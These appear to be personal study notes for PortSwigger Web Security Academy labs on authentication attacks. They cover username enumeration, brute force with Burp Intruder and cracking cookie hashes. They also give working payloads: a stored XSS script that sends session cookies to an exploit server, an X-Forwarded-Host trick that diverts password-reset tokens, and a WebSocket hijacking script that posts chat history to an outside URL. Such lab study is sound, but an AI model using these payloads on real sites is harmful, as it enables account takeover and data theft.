Authentications tips

Tipically, try to enumerate the username at first, and after go for the password if there isn't any restrictions on the tentative

In a normal way you can use the sniper mode in burp intruder, in other scenario you can use cluster bomb and do all in one brute action

Sometimes you can, instead, try to attempt a login 5 times with every username, in order to get a different error message. This will allow you, possibly, to enumerate the right username.
Sometimes grep the error message to have a better understanding

In other scenario, you can face the Base64-encoded cookie for the option stay-logged-in

wiener:51dc30ddc473d43a6011e9ebba6ca770

This could be the common structure:
base64(username+':'+md5HashOfPassword)

you can use payload processing option and set the order to process your payload

1: Hash: MD5
2: Add Prefix: carlos:
3: Encode -> Base64-encode

---------------------------- TIP ---------------------------------

Example for a Stored XSS to retrive cookie session through comment

<script>document.location='//exploit-0adb00eb0408b931c0c44d7d01d90077.web-security-academy.net/'+document.cookie</script>

This exploit will redirect the user, once the request is loaded to your exploit server, where you can find his own cookie session

---------------------------- TIP ---------------------------------


Sometimes you can forward the reset link password to a server of your own in order to retrive the temporary ticket, this is possible if the "X-Forwarded-Host" header is enable

X-Forwarded-Host: your-exploit-server-id.web-security-academy.net

This will dinamiccaly change the url which the token will be send


Sometimes, in the webSocket, you need to create a fake websocket in other to retrive the chat history, utilizing the exploit server

<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
